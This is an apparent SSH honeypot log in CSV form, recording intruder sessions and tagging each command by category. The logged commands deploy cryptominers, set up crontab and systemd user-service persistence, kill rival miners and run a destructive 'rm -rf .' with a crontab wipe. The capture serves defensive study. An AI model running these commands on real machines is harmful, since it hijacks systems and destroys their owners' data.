session_id,ip,username,mode,ssh_original_command,categories,malware_upload,malware_upload_reasons,termination_reason,created_files
1776701156_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776701158_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776701160_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776701163_149.210.235.123_41352_sshshadow,149.210.235.123,admin,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,,
1776701164_149.210.235.123_41352_sshshadow,149.210.235.123,admin,,"cd ""/tmp"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,,
1776701164_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776701165_149.210.235.123_41352_sshshadow,149.210.235.123,admin,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776701166_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701169_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701173_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776708241_86.38.24.201_13583_sshshadow,86.38.24.201,ubuntu,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776708241_86.38.24.201_29747_sshshadow,86.38.24.201,test,,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,,
1776708242_86.38.24.201_29747_sshshadow,86.38.24.201,test,,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,,
1776708244_86.38.24.201_13583_sshshadow,86.38.24.201,ubuntu,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776708246_86.38.24.201_13583_sshshadow,86.38.24.201,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776708252_86.38.24.201_23197_sshshadow,86.38.24.201,admin,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776708254_86.38.24.201_23197_sshshadow,86.38.24.201,admin,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776708256_86.38.24.201_23197_sshshadow,86.38.24.201,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776708259_86.38.24.201_30277_sshshadow,86.38.24.201,deploy,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776708261_86.38.24.201_30277_sshshadow,86.38.24.201,deploy,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776708263_86.38.24.201_30277_sshshadow,86.38.24.201,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776710429_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776710432_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776710437_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776710440_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776710443_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776710444_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776710446_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776710449_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776710450_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776710462_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776710463_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,,
1776710464_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776710464_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,,
1776710465_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776710466_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776710575_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776710577_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776710579_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776710581_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776710584_149.210.235.123_41472_sshshadow,149.210.235.123,test,,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_23,
1776710585_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776710587_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776710589_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776710591_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776710592_149.210.235.123_38800_sshshadow,149.210.235.123,admin,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,,
1776710593_149.210.235.123_38800_sshshadow,149.210.235.123,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/tmp"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776710595_149.210.235.123_38800_sshshadow,149.210.235.123,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776710595_149.210.235.123_41472_sshshadow,149.210.235.123,test,,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,,
1776710597_149.210.235.123_38800_sshshadow,149.210.235.123,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776710599_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776767603_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",normal_exit,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767607_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Data / credential hunting; Generic recon; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",normal_exit,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767610_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Data / credential hunting; Host profiling; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767614_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",Data / credential hunting; File transfer / staging; GCS-aware discovery; Generic recon; Host profiling; Miner deployment; SSH persistence,True,"script_upload_via_stdin_or_scp; suspicious_created_files:dev/shm/w.sh,tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json; script_body_captured_in_exec_stdout",normal_exit,dev/shm/w.sh; tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767617_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Data / credential hunting; Miner deployment; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767621_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',Data / credential hunting; File transfer / staging; Miner deployment; SSH persistence,True,"script_upload_via_stdin_or_scp; suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_1,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767625_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Data / credential hunting; GCS-aware discovery; Generic recon; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",normal_exit,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767628_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,readlink -f /proc/gcs/exe,Data / credential hunting; GCS-aware discovery; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767632_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,kill -9 $(lsof +D . 2>/dev/null | awk '{print $2}' | sort -u); rm -rf .; crontab -l 2>/dev/null | grep -v . | crontab -,Data / credential hunting; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767635_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,kill -9 gcs,Data / credential hunting; GCS-aware discovery; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_1,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767638_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,readlink -f /proc/gcs/exe,Data / credential hunting; GCS-aware discovery; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767641_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,kill -9 $(lsof +D . 2>/dev/null | awk '{print $2}' | sort -u); rm -rf .; crontab -l 2>/dev/null | grep -v . | crontab -,Data / credential hunting; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767645_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,,kill -9 gcs,GCS-aware discovery,False,,,
1776767650_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,,
1776767794_149.210.235.123_37116_sshshadow,149.210.235.123,test,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776767795_149.210.235.123_37116_sshshadow,149.210.235.123,test,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,True,suspicious_created_files:usr/lib/python3.11/sitecustomize.py,exit_code_125,usr/lib/python3.11/sitecustomize.py
1776767796_149.210.235.123_37116_sshshadow,149.210.235.123,test,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,True,suspicious_created_files:usr/lib/python3.11/sitecustomize.py,exit_code_125,usr/lib/python3.11/sitecustomize.py
1776778791_104.248.164.226_56802_sshshadow,104.248.164.226,deploy,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776796197_104.39.130.23_56542_sshshadow,104.39.130.23,admin,interactive_shell,,Data / credential hunting; Generic recon; SSH persistence,True,"suspicious_created_files:tmp/.session_bashrc,tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",normal_exit,tmp/.session_bashrc; tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
